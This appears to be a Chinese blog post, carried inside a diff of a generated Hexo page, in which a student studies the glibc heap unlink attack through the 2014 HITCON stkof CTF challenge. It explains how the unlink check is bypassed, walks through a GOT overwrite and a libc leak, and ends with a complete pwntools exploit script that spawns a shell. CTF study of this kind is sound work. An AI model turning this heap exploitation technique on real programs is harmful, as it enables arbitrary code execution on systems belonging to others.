@@ -1,0 +1,519 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#795548">
+  <meta name="description" content="">
+  <meta name="author" content="一叶枯舟">
+  <meta name="keywords" content="">
+  
+  <title>unlink漏洞学习 - 一叶枯舟</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>一叶枯舟</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="unlink漏洞学习">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-04-15 21:45" pubdate>
+        2021年4月15日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.7k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      21
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">unlink漏洞学习</h1>
+            
+            <div class="markdown-body">
+              <h1 id="堆的unlink漏洞学习"><a class="markdownIt-Anchor" href="#堆的unlink漏洞学习"></a> 堆的unlink漏洞学习</h1>
+<h2 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h2>
+<p>做实验做到的堆部分，第一个就是这个，以前没怎么详细做过堆的题，理解起来真的困难，看了几天才能理解，还是太菜了。就决定要把这个记录下来TAT</p>
+<h2 id="unlink基本原理"><a class="markdownIt-Anchor" href="#unlink基本原理"></a> Unlink基本原理</h2>
+<p>Unlink的目的是把一个双向链表中的空闲块拿出来（例如 free 时和目前物理相邻的 free chunk 进行合并）。其基本的过程如下</p>
+<img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/unlink.png" srcset="/img/loading.gif" lazyload alt="unlink基本原理" style="zoom:67%;">
+<p>目的是为了把图中的P拿出来，然后使FD-&gt;bk=BK 以及BK-&gt;fd=FD，其实这里说的也已经很清楚<a target="_blank" rel="noopener" href="https://wiki.x10sec.org/pwn/linux/glibc-heap/unlink-zh/#_2">CTF wiki unlink</a>，不过我就是不明白unlink的一个检查机制</p>
+<p>双向链表指针破坏：前一个块的 fd 和下一个块的 bk 应该指向当前 unlink</p>
+<p>块。当攻击者使用 free -12 和 shellcode 地址覆</p>
+<p>盖 fd 和 bk 时， free 和 shellcode 地址 + 8 就不会指向当前 unlink 块</p>
+<p>（ second ）。因此 glibc malloc 就抛出双向链表指针破坏错误。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>))<br><span class="hljs-built_in">malloc_printerr</span> (check_action, <span class="hljs-string">&quot;corrupted double-linked</span><br><span class="hljs-string">list&quot;</span>, P); <br></code></pre></td></tr></table></figure>
+<p>以及这个机制的绕过，这个机制主要是验证p-&gt; fd-&gt; bk == p 和 p-&gt; bk-&gt; fd == p</p>
+<p>绕过主要是令伪造堆快的fd=这个堆快的指针位置-3*偏移，以及bk=这个堆快的指针位置-2*偏移</p>
+<p>这个看得我真的很绕，一时间理解不能，还是太菜了（还有就是这类题都会有个全局指针？）</p>
+<p>不过做了一道题后理解就很清楚了，果然不能光看。</p>
+<h2 id="2014-hitcon-stkof"><a class="markdownIt-Anchor" href="#2014-hitcon-stkof"></a> 2014 HITCON stkof</h2>
+<p>程序开启了canary和堆栈不可执行保护</p>
+<img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213154332.png" srcset="/img/loading.gif" lazyload alt="检查" style="zoom:67%;">                       
+<p>程序运行后没有什么显示，但是根据ida查看可以知道，程序有3个功能</p>
+<img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213239564.png" srcset="/img/loading.gif" lazyload alt="运行" style="zoom:67%;">
+<p>输入1是申请堆块，然后输入大小，这里注意有一个全局变量，每次申请的内存地址都存放在这个全局变量中</p>
+ <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213308210.png" srcset="/img/loading.gif" lazyload alt="输入1的函数" style="zoom:67%;">
+<p>输入2是编辑堆块，先输入目录号，然后输入长度，再输入内容</p>
+ <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213349366.png" srcset="/img/loading.gif" lazyload alt="输入2的函数" style="zoom:67%;">
+<p>输入3是进行free的操作</p>
+ <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213416269.png" srcset="/img/loading.gif" lazyload alt="输入3的操作" style="zoom:67%;">
+<p><strong>注意这里所有操作都是通过全局变量指针s来进行的</strong></p>
+<h3 id="利用思路"><a class="markdownIt-Anchor" href="#利用思路"></a> 利用思路</h3>
+<ol>
+<li>
+<p>首先创建4个堆块，3号堆块必须不是fastbin，不然不会向前合并，然后在2号堆块伪造chunk，令fd=chunk2的全局变量指针-0x18，bk= chunk2的全局变量指针-0x10</p>
+</li>
+<li>
+<p>在第二个堆块中伪造fake chunk，然后free第三个堆块进行unlink，unlink操作会把伪造堆块的fd写入原来全局变量的chunk2的指针处。</p>
+</li>
+<li>
+<p>这时候修改chunk2，因为chunk2的指针是就等于修改chunk2的全局变量指针-0x18处的值。</p>
+</li>
+<li>
+<p>编辑chunk2（也就是chunk2的全局变量指针-0x18）开始编辑，把free的got表覆盖全局变量的chunk1指针处，然后通过编辑功能修改chunk1指针（也就是free的got表）为put的plt表，然后free掉chunk2，就可以泄露处put的真实地址，然后计算system和bin/sh的真实地址</p>
+</li>
+<li>
+<p>最后把free的got表覆盖为system的地址，然后编辑chunk4中为/bin/sh的地址，然后free掉chunk4，触发system（/bin/sh）即可完成利用</p>
+</li>
+</ol>
+<h3 id="攻击过程"><a class="markdownIt-Anchor" href="#攻击过程"></a> 攻击过程</h3>
+<p>首先创建4个堆块，大小分别为0x20，0x30，0x80，0x20，堆块3不能是fastbin，否则不能触发合并。</p>
+ <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213459651.png" srcset="/img/loading.gif" lazyload alt="创建堆快" style="zoom:67%;">
+<p>查看全局变量s的位置，4个堆块的指针都记录在上面</p>
+ <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213531336.png" srcset="/img/loading.gif" lazyload alt="全局变量查看" style="zoom:67%;">
+<p>然后修改chunk2伪造堆块</p>
+ <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213556648.png" srcset="/img/loading.gif" lazyload alt="伪造的chunk2" style="zoom:67%;">
+<p>0是伪造堆块的prev_size，0x30是size</p>
+<p>0x602138是chunk2的全局变量指针-0x10(这里是0x612150-0x18)在伪造堆块的fd位置</p>
+<p>0x602140是chunk2的全局变量指针-0x10(这里是0x612150-0x18)在位置堆块的bk位置</p>
+<p>然后覆盖chunk3的prev_size为0x30，size为0x90，让系统以为伪造的堆块处于空闲状态</p>
+<p>进行free（3）的操作后，判断伪造的chunk2是处于空闲状态，然后判断</p>
+<p>p-&gt; fd-&gt; bk = = p 和 p-&gt; bk-&gt; fd ==p，这里p-&gt; fd=0x602138，然后从0x602138取4个地址偏移的位置（看成一个0x602138起始的堆块取bk），刚刚好是全局指针0x602150=&gt;0x2846460=p，验证通过，然后p-&gt; bk-&gt; fd ==p的过程同上。</p>
+<p>然后进行unlink操作</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++">FD = p-&gt;fd;<br>BK = p-&gt;bk;<br>FD-&gt;bk = BK;<br>BK-&gt;fd = FD;<br></code></pre></td></tr></table></figure>
+<p>这里FD-&gt;bk和BK-&gt;fd都是chunk2在全局变量指针中的地址，最后会进行BK-&gt;fd = FD，把伪造chunk2的FD复制到chunk2全局变量指针的位置，结果如下</p>
+ <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213704244.png" srcset="/img/loading.gif" lazyload alt="最后进行的BK->fd操作" style="zoom:67%;">
+<p>可以看到0x602150（原来chunk2的指针位置）被覆盖成了伪造chunk2的FD（0x602138）</p>
+<p>然后进行修改chunk2的操作（先从全局变量取指针0x602150-&gt;0x602138），然后就可以修改0x602138的位置的内容，这时把chunk1的全局变量指针改为free的got表地址，chunk2的全局变量指针改为put的plt表地址（用于put出put函数真实地址）</p>
+ <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213750481.png" srcset="/img/loading.gif" lazyload alt="编辑chunk1" style="zoom:67%;">
+<p>这里0x602148和0x602150已经被修改为free_got和put_plt</p>
+<p>然后进行修改chunk1的操作，就会从0x602148取指针（free_got）然后就可以把free的got表地址修改为put_got的地址</p>
+<p>进行free（2）的操作，实际上是put出put_plt泄露出真实地址</p>
+ <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213836064.png" srcset="/img/loading.gif" lazyload alt="泄露的put真实地址" style="zoom:67%;">
+<p>后续操作就是计算system已经/bin/sh的地址了，最后同上修改free的got表地址为system的地址，修改chunk4为/bin/sh，进行free（4）的操作就可以了。</p>
+<p>脚本如下，参考了https://bbs.pediy.com/thread-247007.htm</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br> <br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br> <br>context(log_level = <span class="hljs-string">&quot;debug&quot;</span>,os = <span class="hljs-string">&quot;linux&quot;</span>)<br><br>p = process(<span class="hljs-string">&quot;./stkof&quot;</span>)<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">malloc</span>(<span class="hljs-params">size</span>):</span><br>    p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">&quot;OK\n&quot;</span>)<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>    p.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,strings</span>):</span><br>    p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(strings)))<br>    p.send(strings)<br>    p.recvuntil(<span class="hljs-string">&quot;OK\n&quot;</span>)<br> <br>malloc(<span class="hljs-number">0x20</span>)<br>malloc(<span class="hljs-number">0x30</span>)<br>malloc(<span class="hljs-number">0x80</span>)<br>malloc(<span class="hljs-number">0x20</span>)<br><span class="hljs-comment">#创建4个堆快，第三个用来free的堆快不能是fastbin</span><br><br>target = <span class="hljs-number">0x602140</span> + <span class="hljs-number">0x10</span><br>fd = target - <span class="hljs-number">0x18</span><br>bk = target - <span class="hljs-number">0x10</span><br><br>payload = p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#伪造堆块的prev_size</span><br>payload += p64(<span class="hljs-number">0x30</span>) <span class="hljs-comment">#伪造堆块的size</span><br>payload += p64(fd) + p64(bk)<br>payload += <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x10</span><br>payload += p64(<span class="hljs-number">0x30</span>) + p64(<span class="hljs-number">0x90</span>)  <span class="hljs-comment">#更改chunk3的标志位，会认为前一个堆快是空闲的触发unlink</span><br>edit(<span class="hljs-number">2</span>,payload)<br><br>free(<span class="hljs-number">3</span>)<br>p.recvuntil(<span class="hljs-string">&quot;OK\n&quot;</span>)<br><br>elf = ELF(<span class="hljs-string">&quot;./stkof&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br> <br>free_got = elf.got[<span class="hljs-string">&quot;free&quot;</span>]<br>puts_got = elf.got[<span class="hljs-string">&quot;puts&quot;</span>]<br>puts_plt = elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>payload2 = <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x10</span> <br>payload2 += p64(free_got) + p64(puts_got)<br>edit(<span class="hljs-number">2</span>,payload2)<br><br>payload3 = p64(puts_plt)<br>edit(<span class="hljs-number">1</span>,payload3)<br><span class="hljs-comment">#修改chunk1的操作，就会从0x602148取指针（free_got）然后就可以把free的got表地址修改为put_got的地址 </span><br>free(<span class="hljs-number">2</span>)<br>puts_addr = u64(p.recvuntil(<span class="hljs-string">&quot;\nOK\n&quot;</span>,drop = <span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><br><span class="hljs-comment">#gdb.attach(p)</span><br>puts_offset = libc.symbols[<span class="hljs-string">&quot;puts&quot;</span>]<br>system_offset = libc.symbols[<span class="hljs-string">&quot;system&quot;</span>]<br>binp_offset = libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>).<span class="hljs-built_in">next</span>()<br> <br>libc_base = puts_addr - puts_offset<br> <br>system_addr = libc_base + system_offset<br> <br>payload4 = p64(system_addr)<br><br>edit(<span class="hljs-number">1</span>,payload4)<br><span class="hljs-comment">#再次修改chunk1，把free_got修改为system的地址</span><br><br>edit(<span class="hljs-number">4</span>,<span class="hljs-string">&quot;/bin/sh\00&quot;</span>)<br>free(<span class="hljs-number">4</span>)<br> <br>p.interactive()<br><br></code></pre></td></tr></table></figure>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/PWN%E5%AD%A6%E4%B9%A0/">PWN学习</a>
+                    
+                      <a class="hover-with-bg" href="/categories/PWN%E5%AD%A6%E4%B9%A0/%E5%AD%A6%E4%B9%A0/">学习</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/PWN%E5%AD%A6%E4%B9%A0/">PWN学习</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/03/30/cumtctf/">
+                        <span class="hidden-mobile">CUMTCTF春季赛-PWN</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      $('#local-search-input').on('click', function() {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      });
+      $('#modalSearch').on('shown.bs.modal', function() {
+        $('#local-search-input').focus();
+      });
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
